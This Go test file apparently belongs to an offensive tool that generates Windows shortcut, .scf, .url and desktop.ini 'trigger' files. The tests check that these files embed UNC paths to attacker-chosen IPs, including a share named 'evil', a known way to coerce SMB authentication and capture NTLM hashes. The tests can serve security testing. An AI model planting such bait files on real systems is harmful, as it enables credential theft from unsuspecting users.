package lnkgen

import (
	"bytes"
	"encoding/binary"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestBuildLNK_Header(t *testing.T) {
	data := BuildLNK(`\\10.0.0.1\share`)
	if len(data) < 76 {
		t.Fatalf("too short: %d bytes", len(data))
	}
	if binary.LittleEndian.Uint32(data[0:4]) != 0x0000004C {
		t.Fatal("LNK header size field wrong")
	}
	clsid := data[4:20]
	want := []byte{0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}
	if !bytes.Equal(clsid, want) {
		t.Fatalf("CLSID mismatch: %v", clsid)
	}
}

func TestBuildLNK_ContainsUNC(t *testing.T) {
	unc := `\\192.168.1.100\evil`
	data := BuildLNK(unc)
	if !bytes.Contains(data, []byte(unc)) {
		t.Fatal("LNK data should contain UNC path")
	}
}

func TestBuildLNK_MinimumSize(t *testing.T) {
	data := BuildLNK(`\\1.2.3.4\s`)
	if len(data) < 76+28 {
		t.Fatalf("LNK too small: %d bytes", len(data))
	}
}

func TestGenerateTriggerFiles_CreatesAll(t *testing.T) {
	dir := t.TempDir()
	ip := net.ParseIP("10.0.0.5")
	if err := GenerateTriggerFiles(ip, dir); err != nil {
		t.Fatalf("GenerateTriggerFiles: %v", err)
	}
	expected := []string{"@trigger.scf", "@trigger.url", "desktop.ini", "@trigger.lnk"}
	for _, name := range expected {
		path := filepath.Join(dir, name)
		if _, err := os.Stat(path); os.IsNotExist(err) {
			t.Fatalf("expected file missing: %s", name)
		}
	}
}

func TestGenerateTriggerFiles_ContentContainsUNC(t *testing.T) {
	dir := t.TempDir()
	ip := net.ParseIP("172.16.0.1")
	if err := GenerateTriggerFiles(ip, dir); err != nil {
		t.Fatalf("GenerateTriggerFiles: %v", err)
	}
	unc := `\\172.16.0.1\share`
	for _, name := range []string{"@trigger.scf", "@trigger.url", "desktop.ini"} {
		data, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			t.Fatalf("read %s: %v", name, err)
		}
		if !strings.Contains(string(data), unc) {
			t.Fatalf("%s: expected UNC %s, got:\n%s", name, unc, string(data))
		}
	}
}

func TestGenerateTriggerFiles_MkdirAll(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "nested", "deep", "dir")
	ip := net.ParseIP("10.10.10.10")
	if err := GenerateTriggerFiles(ip, dir); err != nil {
		t.Fatalf("should create nested dirs: %v", err)
	}
}
